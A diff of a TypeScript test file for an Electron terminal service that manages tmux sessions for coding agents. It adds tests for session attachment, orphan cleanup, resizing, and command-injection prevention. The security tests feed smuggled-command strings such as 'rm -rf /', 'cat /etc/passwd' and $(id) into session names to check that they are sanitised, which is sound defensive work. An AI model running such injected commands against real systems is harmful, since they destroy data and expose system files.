@@ -3,7 +3,7 @@ import { TerminalService } from '../TerminalService'
 import { BrowserWindow } from 'electron'
 import * as pty from 'node-pty'
 import * as fs from 'fs'
-import { execSync } from 'child_process'
+import { execSync, execFileSync } from 'child_process'
 
 vi.mock('electron', () => ({
   BrowserWindow: vi.fn(),
@@ -19,11 +19,14 @@ vi.mock('fs', () => ({
   existsSync: vi.fn(),
   statSync: vi.fn(),
   mkdirSync: vi.fn(),
-  writeFileSync: vi.fn()
+  writeFileSync: vi.fn(),
+  mkdtempSync: vi.fn().mockReturnValue('/tmp/minion-test123'),
+  rmSync: vi.fn()
 }))
 
 vi.mock('child_process', () => ({
-  execSync: vi.fn()
+  execSync: vi.fn(),
+  execFileSync: vi.fn()
 }))
 
 function createMockAgentService(): any {
@@ -65,7 +68,8 @@ function setupDefaultMocks(mockPty: any): void {
   vi.mocked(fs.existsSync).mockReturnValue(true)
   vi.mocked(fs.statSync).mockReturnValue({
     isDirectory: () => true,
-    mode: 0o755
+    mode: 0o755,
+    mtimeMs: Date.now()  // Add mtimeMs for file change detection
   } as any)
 }
 
@@ -83,6 +87,83 @@ describe('TerminalService Tmux Integration', () => {
     mockSettingsService = createMockSettingsService('tmux')
     setupDefaultMocks(mockPty)
     terminalService = new TerminalService(mockMainWindow)
+  })
+
+  describe('isTmuxSessionAttached', () => {
+    it('returns true when session exists and is attached', () => {
+      // Mock tmux availability and list-sessions output
+      vi.mocked(execSync).mockImplementation((cmd: string) => {
+        if (cmd === 'which tmux') {
+          return Buffer.from('/usr/bin/tmux')
+        }
+        if (cmd.includes('list-sessions')) {
+          return 'minion-agent-1:1\nminion-agent-2:0\n'
+        }
+        return Buffer.from('')
+      })
+
+      const result = terminalService.isTmuxSessionAttached('minion-agent-1')
+
+      expect(result).toBe(true)
+    })
+
+    it('returns false when session exists but not attached', () => {
+      vi.mocked(execSync).mockImplementation((cmd: string) => {
+        if (cmd === 'which tmux') {
+          return Buffer.from('/usr/bin/tmux')
+        }
+        if (cmd.includes('list-sessions')) {
+          return 'minion-agent-1:0\nminion-agent-2:1\n'
+        }
+        return Buffer.from('')
+      })
+
+      const result = terminalService.isTmuxSessionAttached('minion-agent-1')
+
+      expect(result).toBe(false)
+    })
+
+    it('returns false when session does not exist', () => {
+      vi.mocked(execSync).mockImplementation((cmd: string) => {
+        if (cmd === 'which tmux') {
+          return Buffer.from('/usr/bin/tmux')
+        }
+        if (cmd.includes('list-sessions')) {
+          return 'minion-other-1:1\nminion-other-2:0\n'
+        }
+        return Buffer.from('')
+      })
+
+      const result = terminalService.isTmuxSessionAttached('minion-agent-1')
+
+      expect(result).toBe(false)
+    })
+
+    it('returns false when tmux is unavailable', () => {
+      vi.mocked(execSync).mockImplementation(() => {
+        throw new Error('tmux not found')
+      })
+
+      const result = terminalService.isTmuxSessionAttached('minion-agent-1')
+
+      expect(result).toBe(false)
+    })
+
+    it('returns false when list-sessions fails (no server running)', () => {
+      vi.mocked(execSync).mockImplementation((cmd: string) => {
+        if (cmd === 'which tmux') {
+          return Buffer.from('/usr/bin/tmux')
+        }
+        if (cmd.includes('list-sessions')) {
+          throw new Error('no server running on /tmp/tmux-501/default')
+        }
+        return Buffer.from('')
+      })
+
+      const result = terminalService.isTmuxSessionAttached('minion-agent-1')
+
+      expect(result).toBe(false)
+    })
   })
 
   describe('isTmuxAvailable', () => {
@@ -138,19 +219,21 @@ describe('TerminalService Tmux Integration', () => {
 
   describe('killTmuxSession', () => {
     it('kills tmux session when it exists', () => {
-      vi.mocked(execSync).mockReturnValue(Buffer.from(''))
+      vi.mocked(execFileSync).mockReturnValue(Buffer.from(''))
 
       terminalService.killTmuxSession('agent-123')
 
-      expect(execSync).toHaveBeenCalledWith(
-        expect.stringContaining('tmux kill-session'),
+      // SECURITY: Uses execFileSync with argument array to prevent command injection
+      expect(execFileSync).toHaveBeenCalledWith(
+        'tmux',
+        ['kill-session', '-t', 'minion-agent-123'],
         expect.any(Object)
       )
     })
 
     it('does not throw when session does not exist', () => {
       // Mock kill-session throwing (session doesn't exist)
-      vi.mocked(execSync).mockImplementation(() => {
+      vi.mocked(execFileSync).mockImplementation(() => {
         throw new Error('session not found')
       })
 
@@ -159,12 +242,14 @@ describe('TerminalService Tmux Integration', () => {
     })
 
     it('uses sanitized session name', () => {
-      vi.mocked(execSync).mockReturnValue(Buffer.from(''))
+      vi.mocked(execFileSync).mockReturnValue(Buffer.from(''))
 
       terminalService.killTmuxSession('agent/with:special.chars')
 
-      expect(execSync).toHaveBeenCalledWith(
-        expect.stringContaining('minion-agent_with_special_chars'),
+      // SECURITY: Uses execFileSync with argument array to prevent command injection
+      expect(execFileSync).toHaveBeenCalledWith(
+        'tmux',
+        ['kill-session', '-t', 'minion-agent_with_special_chars'],
         expect.any(Object)
       )
     })
@@ -177,8 +262,19 @@ describe('TerminalService Tmux Integration', () => {
     })
 
     it('sends tmux new-session command when tmux mode is enabled and tmux is available', async () => {
-      // tmux is available
-      vi.mocked(execSync).mockReturnValue(Buffer.from('/usr/bin/tmux'))
+      // tmux is available, but no existing session
+      vi.mocked(execSync).mockImplementation((cmd: string) => {
+        if (cmd.includes('which tmux')) return Buffer.from('/usr/bin/tmux')
+        if (cmd.includes('has-session')) throw new Error('session not found')
+        return Buffer.from('')
+      })
+      // Mock has-session check using execFileSync to indicate no session exists
+      vi.mocked(execFileSync).mockImplementation((cmd: string, args?: readonly string[]) => {
+        if (cmd === 'tmux' && args?.includes('has-session')) {
+          throw new Error('session not found')
+        }
+        return Buffer.from('')
+      })
 
       await terminalService.startAgent('/path/to/project', 'agent-1', 'claude', 'dev')
 
@@ -242,8 +338,107 @@ describe('TerminalService Tmux Integration', () => {
       expect(hasTerminal).toBe(true)
     })
 
+    it('attaches to tmux session when already attached elsewhere (multi-window support)', async () => {
+      vi.useFakeTimers()
+
+      // Mock tmux available and session already attached WITH Claude running
+      vi.mocked(execSync).mockImplementation((cmd: string) => {
+        if (cmd.includes('which tmux')) return Buffer.from('/usr/bin/tmux')
+        if (cmd.includes('has-session')) return Buffer.from('') // Session exists
+        if (cmd.includes('list-sessions')) return 'minion-agent-1:1\n'  // Session is attached
+        return Buffer.from('')
+      })
+      // Mock has-session check and Claude detection using execFileSync
+      vi.mocked(execFileSync).mockImplementation((cmd: string, args?: readonly string[]) => {
+        // Session exists - don't throw for has-session
+        if (cmd === 'tmux' && args?.includes('has-session')) {
+          return Buffer.from('')
+        }
+        // Return pane PID for list-panes (Claude detection)
+        if (cmd === 'tmux' && args?.includes('list-panes')) {
+          return '12345\n'
+        }
+        // ps command for Claude detection - show Claude as descendant of pane PID
+        if (cmd === 'ps' && args?.includes('-ax')) {
+          // Process tree: pane (12345) -> shell (12346) -> claude (12347)
+          return '12345 1 bash\n12346 12345 bash\n12347 12346 claude\n'
+        }
+        return Buffer.from('')
+      })
+
+      await terminalService.startAgent('/path/to/project', 'agent-1', 'claude', 'dev')
+
+      // Advance timers to trigger the delayed tmux attach
+      await vi.advanceTimersByTimeAsync(150)
+
+      // Should spawn PTY to run tmux attach
+      expect(pty.spawn).toHaveBeenCalled()
+
+      // Should run tmux attach-session (allows multiple clients on same session)
+      const writeCalls = mockPty.write.mock.calls
+      expect(writeCalls.length).toBeGreaterThanOrEqual(1)
+      expect(writeCalls[0][0]).toContain('tmux attach-session -t minion-agent-1')
+
+      vi.useRealTimers()
+    })
+
+    it('attaches to existing tmux session when Claude is running (even if not attached elsewhere)', async () => {
+      vi.useFakeTimers()
+
+      // Mock tmux available and session exists (not attached) WITH Claude running
+      vi.mocked(execSync).mockImplementation((cmd: string) => {
+        if (cmd.includes('which tmux')) return Buffer.from('/usr/bin/tmux')
+        if (cmd.includes('has-session')) return Buffer.from('') // Session exists
+        if (cmd.includes('list-sessions')) return 'minion-agent-1:0\n'
+        return Buffer.from('')
+      })
+      // Mock has-session check and Claude detection using execFileSync
+      vi.mocked(execFileSync).mockImplementation((cmd: string, args?: readonly string[]) => {
+        // Session exists - don't throw for has-session
+        if (cmd === 'tmux' && args?.includes('has-session')) {
+          return Buffer.from('')
+        }
+        // Return pane PID for list-panes (Claude detection)
+        if (cmd === 'tmux' && args?.includes('list-panes')) {
+          return '12345\n'
+        }
+        // ps command for Claude detection - show Claude as descendant of pane PID
+        if (cmd === 'ps' && args?.includes('-ax')) {
+          // Process tree: pane (12345) -> shell (12346) -> claude (12347)
+          return '12345 1 bash\n12346 12345 bash\n12347 12346 claude\n'
+        }
+        return Buffer.from('')
+      })
+
+      await terminalService.startAgent('/path/to/project', 'agent-1', 'claude', 'dev')
+
+      // Advance timers to trigger the delayed tmux attach
+      await vi.advanceTimersByTimeAsync(150)
+
+      // Should spawn PTY and proceed
+      expect(pty.spawn).toHaveBeenCalled()
+
+      // Should attach to existing session (not create new) because Claude is running
+      const writeCalls = mockPty.write.mock.calls
+      expect(writeCalls.length).toBeGreaterThanOrEqual(1)
+      expect(writeCalls[0][0]).toContain('tmux attach-session -t minion-agent-1')
+
+      vi.useRealTimers()
+    })
+
     it('writes command to temp script file for tmux mode', async () => {
-      vi.mocked(execSync).mockReturnValue(Buffer.from('/usr/bin/tmux'))
+      vi.mocked(execSync).mockImplementation((cmd: string) => {
+        if (cmd.includes('which tmux')) return Buffer.from('/usr/bin/tmux')
+        if (cmd.includes('has-session')) throw new Error('session not found')
+        return Buffer.from('')
+      })
+      // Mock has-session check using execFileSync to indicate no session exists
+      vi.mocked(execFileSync).mockImplementation((cmd: string, args?: readonly string[]) => {
+        if (cmd === 'tmux' && args?.includes('has-session')) {
+          throw new Error('session not found')
+        }
+        return Buffer.from('')
+      })
 
       // Prompt contains single quotes (common in super minion prompts like "Claude Code's Task tool")
       const promptWithQuotes = "Use Claude Code's Task tool"
@@ -256,21 +451,32 @@ describe('TerminalService Tmux Integration', () => {
         promptWithQuotes
       )
 
-      // Verify script file was written
+      // Verify script file was written to temp directory with cmd prefix
       expect(fs.writeFileSync).toHaveBeenCalledWith(
-        '/path/to/project-agent-1/.minion-cmd.sh',
+        expect.stringMatching(/cmd-agent-1\.sh$/),
         expect.stringContaining('#!/bin/bash'),
         expect.any(Object)
       )
 
-      // Verify terminal command runs the script
+      // Verify terminal command runs the script from temp directory
       const writeCalls = mockPty.write.mock.calls
       const firstWrite = writeCalls[0][0]
-      expect(firstWrite).toContain('bash /path/to/project-agent-1/.minion-cmd.sh')
+      expect(firstWrite).toContain('cmd-agent-1.sh')
     })
 
     it('script file contains the full command with special characters', async () => {
-      vi.mocked(execSync).mockReturnValue(Buffer.from('/usr/bin/tmux'))
+      vi.mocked(execSync).mockImplementation((cmd: string) => {
+        if (cmd.includes('which tmux')) return Buffer.from('/usr/bin/tmux')
+        if (cmd.includes('has-session')) throw new Error('session not found')
+        return Buffer.from('')
+      })
+      // Mock has-session check using execFileSync to indicate no session exists
+      vi.mocked(execFileSync).mockImplementation((cmd: string, args?: readonly string[]) => {
+        if (cmd === 'tmux' && args?.includes('has-session')) {
+          throw new Error('session not found')
+        }
+        return Buffer.from('')
+      })
 
       // Prompt with newlines and quotes
       const complexPrompt = `You are a **Super Minion** using Claude Code's Task tool.
@@ -287,9 +493,9 @@ describe('TerminalService Tmux Integration', () => {
         complexPrompt
       )
 
-      // Get the content written to the script file
+      // Get the content written to the script file (now in temp dir with cmd- prefix)
       const writeCall = vi.mocked(fs.writeFileSync).mock.calls.find(
-        call => String(call[0]).endsWith('.minion-cmd.sh')
+        call => String(call[0]).includes('cmd-')
       )
       expect(writeCall).toBeDefined()
       const scriptContent = writeCall![1] as string
@@ -300,7 +506,18 @@ describe('TerminalService Tmux Integration', () => {
     })
 
     it('handles complex super minion prompts via script file', async () => {
-      vi.mocked(execSync).mockReturnValue(Buffer.from('/usr/bin/tmux'))
+      vi.mocked(execSync).mockImplementation((cmd: string) => {
+        if (cmd.includes('which tmux')) return Buffer.from('/usr/bin/tmux')
+        if (cmd.includes('has-session')) throw new Error('session not found')
+        return Buffer.from('')
+      })
+      // Mock has-session check using execFileSync to indicate no session exists
+      vi.mocked(execFileSync).mockImplementation((cmd: string, args?: readonly string[]) => {
+        if (cmd === 'tmux' && args?.includes('has-session')) {
+          throw new Error('session not found')
+        }
+        return Buffer.from('')
+      })
 
       // Simulate a real super minion prompt with both issues
       const complexPrompt = `You are a **Super Minion** using Claude Code's Task tool.
@@ -321,12 +538,12 @@ describe('TerminalService Tmux Integration', () => {
       const writeCalls = mockPty.write.mock.calls
       const firstWrite = writeCalls[0][0]
 
-      // Should contain the tmux command with -t target for send-keys
+      // Should contain the tmux command with session name and send-keys
       expect(firstWrite).toContain('tmux new-session -A -s minion-agent-1')
-      expect(firstWrite).toContain('send-keys -t minion-agent-1')
+      expect(firstWrite).toContain('send-keys')
 
-      // Should reference the script file, not inline command
-      expect(firstWrite).toContain('.minion-cmd.sh')
+      // Should reference the script file, not inline command (cmd- prefix)
+      expect(firstWrite).toContain('cmd-agent-1.sh')
 
       // Terminal write should be simple - no complex escaping needed
       const beforeCarriageReturn = firstWrite.split('\r')[0]
@@ -353,14 +570,16 @@ describe('TerminalService Tmux Integration', () => {
 
       // Clear previous calls
       vi.mocked(execSync).mockClear()
-      vi.mocked(execSync).mockReturnValue(Buffer.from(''))
+      vi.mocked(execFileSync).mockClear()
+      vi.mocked(execFileSync).mockReturnValue(Buffer.from(''))
 
       // Stop the agent
       terminalService.stopAgent('agent-1')
 
-      // Should have called kill-session
-      expect(execSync).toHaveBeenCalledWith(
-        expect.stringContaining('tmux kill-session -t minion-agent-1'),
+      // Should have called kill-session using execFileSync for security
+      expect(execFileSync).toHaveBeenCalledWith(
+        'tmux',
+        ['kill-session', '-t', 'minion-agent-1'],
         expect.any(Object)
       )
     })
@@ -372,8 +591,9 @@ describe('TerminalService Tmux Integration', () => {
       terminalService.setSettingsService(mockSettingsService)
     })
 
-    it('kills all tmux sessions on cleanup', async () => {
+    it('preserves tmux sessions on cleanup (may be attached elsewhere)', async () => {
       vi.mocked(execSync).mockReturnValue(Buffer.from('/usr/bin/tmux'))
+      vi.mocked(execFileSync).mockReturnValue(Buffer.from(''))
 
       // Start multiple agents
       await terminalService.startAgent('/path/to/project', 'agent-1', 'claude', 'dev')
@@ -381,16 +601,125 @@ describe('TerminalService Tmux Integration', () => {
 
       // Clear previous calls
       vi.mocked(execSync).mockClear()
-      vi.mocked(execSync).mockReturnValue(Buffer.from(''))
+      vi.mocked(execFileSync).mockClear()
 
       // Cleanup all
       terminalService.cleanup()
 
-      // Should have killed both tmux sessions
-      const killCalls = vi.mocked(execSync).mock.calls.filter(
-        call => call[0].includes('kill-session')
+      // Should NOT kill tmux sessions - they may be attached to another window
+      // Check execFileSync since that's what's used for kill-session
+      const killCalls = vi.mocked(execFileSync).mock.calls.filter(
+        call => call[1] && Array.isArray(call[1]) && call[1].includes('kill-session')
       )
-      expect(killCalls.length).toBe(2)
+      expect(killCalls.length).toBe(0)
+    })
+
+    it('stopAgent still kills the tmux session (explicit user action)', async () => {
+      vi.mocked(execSync).mockReturnValue(Buffer.from('/usr/bin/tmux'))
+
+      await terminalService.startAgent('/path/to/project', 'agent-1', 'claude', 'dev')
+
+      // Clear previous calls
+      vi.mocked(execSync).mockClear()
+      vi.mocked(execFileSync).mockClear()
+      vi.mocked(execFileSync).mockReturnValue(Buffer.from(''))
+
+      // Explicitly stop the agent
+      terminalService.stopAgent('agent-1')
+
+      // Should have killed the tmux session using execFileSync
+      const killCalls = vi.mocked(execFileSync).mock.calls.filter(
+        call => call[1] && Array.isArray(call[1]) && call[1].includes('kill-session')
+      )
+      expect(killCalls.length).toBe(1)
+      expect(killCalls[0][1]).toContain('minion-agent-1')
+    })
+  })
+
+  describe('killOrphanedTmuxSessions', () => {
+    it('only kills sessions without active agents', () => {
+      // Mock tmux available and list-sessions
+      vi.mocked(execSync).mockImplementation((cmd: string) => {
+        if (cmd === 'which tmux') {
+          return Buffer.from('/usr/bin/tmux')
+        }
+        // list-sessions for session names
+        if (cmd.includes('list-sessions') && !cmd.includes('#{session_attached}')) {
+          return 'minion-agent-1\nminion-agent-2\nminion-orphan-1\n'
+        }
+        // list-sessions for attached check - none attached
+        if (cmd.includes('list-sessions') && cmd.includes('#{session_attached}')) {
+          return 'minion-agent-1:0\nminion-agent-2:0\nminion-orphan-1:0\n'
+        }
+        return Buffer.from('')
+      })
+      vi.mocked(execFileSync).mockReturnValue(Buffer.from(''))
+
+      // agent-1 and agent-2 are active, orphan-1 is not
+      const killed = terminalService.killOrphanedTmuxSessions(['agent-1', 'agent-2'])
+
+      // Should only kill orphan-1
+      expect(killed).toBe(1)
+
+      // Verify kill-session was only called for orphan-1 using execFileSync
+      const killCalls = vi.mocked(execFileSync).mock.calls.filter(
+        call => call[1] && Array.isArray(call[1]) && call[1].includes('kill-session')
+      )
+      expect(killCalls.length).toBe(1)
+      expect(killCalls[0][1]).toContain('minion-orphan-1')
+    })
+
+    it('preserves attached sessions even without active agent', () => {
+      vi.mocked(execSync).mockImplementation((cmd: string) => {
+        if (cmd === 'which tmux') {
+          return Buffer.from('/usr/bin/tmux')
+        }
+        if (cmd.includes('list-sessions') && !cmd.includes('#{session_attached}')) {
+          return 'minion-orphan-1\nminion-orphan-2\n'
+        }
+        if (cmd.includes('list-sessions') && cmd.includes('#{session_attached}')) {
+          return 'minion-orphan-1:1\nminion-orphan-2:0\n'  // orphan-1 attached, orphan-2 not
+        }
+        return Buffer.from('')
+      })
+      vi.mocked(execFileSync).mockReturnValue(Buffer.from(''))
+
+      // No active agents, but orphan-1 is attached (another window)
+      const killed = terminalService.killOrphanedTmuxSessions([])
+
+      // Should only kill orphan-2 (orphan-1 is attached)
+      expect(killed).toBe(1)
+
+      const killCalls = vi.mocked(execFileSync).mock.calls.filter(
+        call => call[1] && Array.isArray(call[1]) && call[1].includes('kill-session')
+      )
+      expect(killCalls.length).toBe(1)
+      expect(killCalls[0][1]).toContain('minion-orphan-2')
+    })
+
+    it('kills no sessions when all have active agents', () => {
+      vi.mocked(execSync).mockImplementation((cmd: string) => {
+        if (cmd === 'which tmux') {
+          return Buffer.from('/usr/bin/tmux')
+        }
+        if (cmd.includes('list-sessions') && !cmd.includes('#{session_attached}')) {
+          return 'minion-active-1\nminion-active-2\n'
+        }
+        if (cmd.includes('list-sessions') && cmd.includes('#{session_attached}')) {
+          return 'minion-active-1:0\nminion-active-2:0\n'  // Not attached but have active agents
+        }
+        return Buffer.from('')
+      })
+
+      const killed = terminalService.killOrphanedTmuxSessions(['active-1', 'active-2'])
+
+      expect(killed).toBe(0)
+
+      // Verify no kill-session calls were made with execFileSync
+      const killCalls = vi.mocked(execFileSync).mock.calls.filter(
+        call => call[1] && Array.isArray(call[1]) && call[1].includes('kill-session')
+      )
+      expect(killCalls.length).toBe(0)
     })
   })
 })
@@ -422,13 +751,24 @@ describe('TerminalService Settings Integration', () => {
   })
 
   it('uses tmux when setting is explicitly set to tmux', async () => {
-    vi.mocked(execSync).mockReturnValue(Buffer.from('/usr/bin/tmux'))
+    vi.mocked(execSync).mockImplementation((cmd: string) => {
+      if (cmd.includes('which tmux')) return Buffer.from('/usr/bin/tmux')
+      if (cmd.includes('has-session')) throw new Error('session not found')
+      return Buffer.from('')
+    })
+    // Mock has-session check using execFileSync to indicate no session exists
+    vi.mocked(execFileSync).mockImplementation((cmd: string, args?: readonly string[]) => {
+      if (cmd === 'tmux' && args?.includes('has-session')) {
+        throw new Error('session not found')
+      }
+      return Buffer.from('')
+    })
     terminalService.setAgentService(createMockAgentService())
     terminalService.setSettingsService(createMockSettingsService('tmux'))
 
     await terminalService.startAgent('/path/to/project', 'agent-1', 'claude', 'dev')
 
-    // Should use tmux
+    // Should use tmux (create new session since none exists)
     const firstWrite = mockPty.write.mock.calls[0][0]
     expect(firstWrite).toContain('tmux new-session -A -s minion-agent-1')
   })
@@ -462,3 +802,548 @@ describe('Plain Terminal with Tmux Mode', () => {
     expect(mockPty.write).not.toHaveBeenCalled()
   })
 })
+
+describe('TerminalService resize with tmux', () => {
+  let terminalService: TerminalService
+  let mockMainWindow: any
+  let mockPty: any
+  let mockSettingsService: any
+
+  beforeEach(() => {
+    vi.clearAllMocks()
+    const windowMocks = createMockMainWindow()
+    mockMainWindow = windowMocks.mainWindow
+    mockPty = createMockPty()
+    mockSettingsService = createMockSettingsService('tmux')
+    setupDefaultMocks(mockPty)
+    terminalService = new TerminalService(mockMainWindow)
+    terminalService.setAgentService(createMockAgentService())
+    terminalService.setSettingsService(mockSettingsService)
+  })
+
+  it('notifies tmux via resize-window when resizing session with tmuxSession', async () => {
+    // tmux is available
+    vi.mocked(execSync).mockReturnValue(Buffer.from('/usr/bin/tmux'))
+
+    // Start agent in tmux mode
+    await terminalService.startAgent('/path/to/project', 'agent-1', 'claude', 'dev')
+
+    // Clear previous calls from startAgent/isTmuxAvailable
+    vi.mocked(execSync).mockClear()
+    vi.mocked(execFileSync).mockClear()
+    vi.mocked(execFileSync).mockReturnValue(Buffer.from(''))
+
+    // Resize the terminal
+    terminalService.resize('agent-1', 120, 40)
+
+    // Should have called pty.resize
+    expect(mockPty.resize).toHaveBeenCalledWith(120, 40)
+
+    // Should have called tmux resize-window for both windows using execFileSync (rows - 1 for status bar)
+    expect(execFileSync).toHaveBeenCalledWith(
+      'tmux',
+      ['resize-window', '-t', 'minion-agent-1:0', '-x', '120', '-y', '39'],
+      expect.any(Object)
+    )
+    expect(execFileSync).toHaveBeenCalledWith(
+      'tmux',
+      ['resize-window', '-t', 'minion-agent-1:1', '-x', '120', '-y', '39'],
+      expect.any(Object)
+    )
+  })
+
+  it('does NOT call tmux resize-window when resizing session without tmuxSession (tabs mode)', async () => {
+    // tmux is available but we use tabs mode
+    vi.mocked(execSync).mockReturnValue(Buffer.from('/usr/bin/tmux'))
+
+    // Change settings to tabs mode
+    mockSettingsService.getSettings.mockReturnValue({
+      terminal: { terminalMode: 'tabs' }
+    })
+
+    // Start agent in tabs mode
+    await terminalService.startAgent('/path/to/project', 'agent-1', 'claude', 'dev')
+
+    // Clear previous calls from startAgent/isTmuxAvailable
+    vi.mocked(execSync).mockClear()
+    vi.mocked(execFileSync).mockClear()
+
+    // Resize the terminal
+    terminalService.resize('agent-1', 120, 40)
+
+    // Should have called pty.resize
+    expect(mockPty.resize).toHaveBeenCalledWith(120, 40)
+
+    // Should NOT have called tmux resize-window (no tmux session)
+    // Check that no execFileSync calls were made with resize-window
+    const resizeCalls = vi.mocked(execFileSync).mock.calls.filter(
+      call => call[1] && Array.isArray(call[1]) && call[1].includes('resize-window')
+    )
+    expect(resizeCalls.length).toBe(0)
+  })
+
+  it('silently handles tmux resize-window failure', async () => {
+    // tmux is available
+    vi.mocked(execSync).mockReturnValue(Buffer.from('/usr/bin/tmux'))
+
+    // Start agent in tmux mode
+    await terminalService.startAgent('/path/to/project', 'agent-1', 'claude', 'dev')
+
+    // Make resize-window fail (e.g., session doesn't exist yet)
+    vi.mocked(execSync).mockClear()
+    vi.mocked(execFileSync).mockClear()
+    vi.mocked(execFileSync).mockImplementation(() => {
+      throw new Error('no server running')
+    })
+
+    // Resize should not throw
+    expect(() => terminalService.resize('agent-1', 120, 40)).not.toThrow()
+
+    // Should still have called pty.resize
+    expect(mockPty.resize).toHaveBeenCalledWith(120, 40)
+  })
+})
+
+describe('TerminalService tmux two windows', () => {
+  let terminalService: TerminalService
+  let mockMainWindow: any
+  let mockPty: any
+  let mockSettingsService: any
+
+  beforeEach(() => {
+    vi.clearAllMocks()
+    const windowMocks = createMockMainWindow()
+    mockMainWindow = windowMocks.mainWindow
+    mockPty = createMockPty()
+    mockSettingsService = createMockSettingsService('tmux')
+    setupDefaultMocks(mockPty)
+    terminalService = new TerminalService(mockMainWindow)
+    terminalService.setAgentService(createMockAgentService())
+    terminalService.setSettingsService(mockSettingsService)
+  })
+
+  it('creates two tmux windows: agent (window 0) and shell (window 1, detached)', async () => {
+    // tmux is available, but session doesn't exist yet
+    vi.mocked(execSync).mockImplementation((cmd: string) => {
+      if (cmd.includes('which tmux')) return Buffer.from('/usr/bin/tmux')
+      if (cmd.includes('has-session')) throw new Error('session not found')
+      return Buffer.from('')
+    })
+    // Mock has-session check using execFileSync to indicate no session exists
+    vi.mocked(execFileSync).mockImplementation((cmd: string, args?: readonly string[]) => {
+      if (cmd === 'tmux' && args?.includes('has-session')) {
+        throw new Error('session not found')
+      }
+      return Buffer.from('')
+    })
+
+    await terminalService.startAgent('/path/to/project', 'agent-1', 'claude', 'dev')
+
+    // Get the tmux command that was written
+    const writeCalls = mockPty.write.mock.calls
+    expect(writeCalls.length).toBeGreaterThanOrEqual(1)
+    const tmuxCommand = writeCalls[0][0]
+
+    // Should create a new window named "shell" with -d flag (detached, doesn't switch focus)
+    expect(tmuxCommand).toContain('new-window -d -n shell')
+
+    // Should NOT have select-window (using -d flag instead)
+    expect(tmuxCommand).not.toContain('select-window')
+  })
+
+  it('creates shell window after agent window in tmux command order', async () => {
+    // tmux is available, but session doesn't exist yet
+    vi.mocked(execSync).mockImplementation((cmd: string) => {
+      if (cmd.includes('which tmux')) return Buffer.from('/usr/bin/tmux')
+      if (cmd.includes('has-session')) throw new Error('session not found')
+      return Buffer.from('')
+    })
+    // Mock has-session check using execFileSync to indicate no session exists
+    vi.mocked(execFileSync).mockImplementation((cmd: string, args?: readonly string[]) => {
+      if (cmd === 'tmux' && args?.includes('has-session')) {
+        throw new Error('session not found')
+      }
+      return Buffer.from('')
+    })
+
+    await terminalService.startAgent('/path/to/project', 'agent-1', 'claude', 'dev')
+
+    const tmuxCommand = mockPty.write.mock.calls[0][0]
+
+    // The order should be: new-session -> send-keys (agent command) -> new-window -d
+    const newSessionIndex = tmuxCommand.indexOf('new-session')
+    const sendKeysIndex = tmuxCommand.indexOf('send-keys')
+    const newWindowIndex = tmuxCommand.indexOf('new-window -d -n shell')
+
+    expect(newSessionIndex).toBeLessThan(sendKeysIndex)
+    expect(sendKeysIndex).toBeLessThan(newWindowIndex)
+  })
+
+  it('attaches to existing tmux session when Claude is running instead of creating new one', async () => {
+    vi.useFakeTimers()
+
+    // tmux is available AND session already exists WITH Claude running
+    vi.mocked(execSync).mockImplementation((cmd: string) => {
+      if (cmd.includes('which tmux')) return Buffer.from('/usr/bin/tmux')
+      if (cmd.includes('has-session')) return Buffer.from('') // Session exists (no error)
+      return Buffer.from('')
+    })
+    // Mock has-session check and Claude detection using execFileSync
+    vi.mocked(execFileSync).mockImplementation((cmd: string, args?: readonly string[]) => {
+      // Session exists - don't throw for has-session
+      if (cmd === 'tmux' && args?.includes('has-session')) {
+        return Buffer.from('')
+      }
+      // Return pane PID for list-panes (Claude detection)
+      if (cmd === 'tmux' && args?.includes('list-panes')) {
+        return '12345\n'
+      }
+      // ps command for Claude detection - show Claude as descendant of pane PID
+      if (cmd === 'ps' && args?.includes('-ax')) {
+        // Process tree: pane (12345) -> shell (12346) -> claude (12347)
+        return '12345 1 bash\n12346 12345 bash\n12347 12346 claude\n'
+      }
+      return Buffer.from('')
+    })
+
+    await terminalService.startAgent('/path/to/project', 'agent-1', 'claude', 'dev')
+
+    // Advance timers to trigger the delayed tmux attach
+    await vi.advanceTimersByTimeAsync(150)
+
+    const writeCalls = mockPty.write.mock.calls
+    expect(writeCalls.length).toBeGreaterThanOrEqual(1)
+    const tmuxCommand = writeCalls[0][0]
+
+    // Should attach to existing session, not create new one (because Claude is running)
+    expect(tmuxCommand).toContain('tmux attach-session -t minion-agent-1')
+    expect(tmuxCommand).not.toContain('new-session')
+    expect(tmuxCommand).not.toContain('send-keys')
+
+    vi.useRealTimers()
+  })
+})
+
+describe('TerminalService Security - Command Injection Prevention', () => {
+  let terminalService: TerminalService
+  let mockMainWindow: any
+  let mockPty: any
+
+  beforeEach(() => {
+    vi.clearAllMocks()
+    const windowMocks = createMockMainWindow()
+    mockMainWindow = windowMocks.mainWindow
+    mockPty = createMockPty()
+    setupDefaultMocks(mockPty)
+    terminalService = new TerminalService(mockMainWindow)
+  })
+
+  describe('getTmuxSessionName - shell injection prevention', () => {
+    it('sanitizes semicolons that could chain commands', () => {
+      const sessionName = terminalService.getTmuxSessionName('agent-1; rm -rf /')
+      expect(sessionName).not.toContain(';')
+      expect(sessionName).toMatch(/^minion-[a-zA-Z0-9_-]+$/)
+    })
+
+    it('sanitizes pipe characters that could pipe to other commands', () => {
+      const sessionName = terminalService.getTmuxSessionName('agent-1 | cat /etc/passwd')
+      expect(sessionName).not.toContain('|')
+      expect(sessionName).toMatch(/^minion-[a-zA-Z0-9_-]+$/)
+    })
+
+    it('sanitizes ampersand for background command execution', () => {
+      const sessionName = terminalService.getTmuxSessionName('agent-1 && malicious')
+      expect(sessionName).not.toContain('&')
+      expect(sessionName).toMatch(/^minion-[a-zA-Z0-9_-]+$/)
+    })
+
+    it('sanitizes backticks for command substitution', () => {
+      const sessionName = terminalService.getTmuxSessionName('agent-`whoami`')
+      expect(sessionName).not.toContain('`')
+      expect(sessionName).toMatch(/^minion-[a-zA-Z0-9_-]+$/)
+    })
+
+    it('sanitizes $() for command substitution', () => {
+      const sessionName = terminalService.getTmuxSessionName('agent-$(id)')
+      expect(sessionName).not.toContain('$')
+      expect(sessionName).not.toContain('(')
+      expect(sessionName).not.toContain(')')
+      expect(sessionName).toMatch(/^minion-[a-zA-Z0-9_-]+$/)
+    })
+
+    it('sanitizes newlines that could inject new commands', () => {
+      const sessionName = terminalService.getTmuxSessionName('agent-1\nrm -rf /')
+      expect(sessionName).not.toContain('\n')
+      expect(sessionName).toMatch(/^minion-[a-zA-Z0-9_-]+$/)
+    })
+
+    it('sanitizes single quotes that could break out of quoted strings', () => {
+      const sessionName = terminalService.getTmuxSessionName("agent-1'; drop table users;--")
+      expect(sessionName).not.toContain("'")
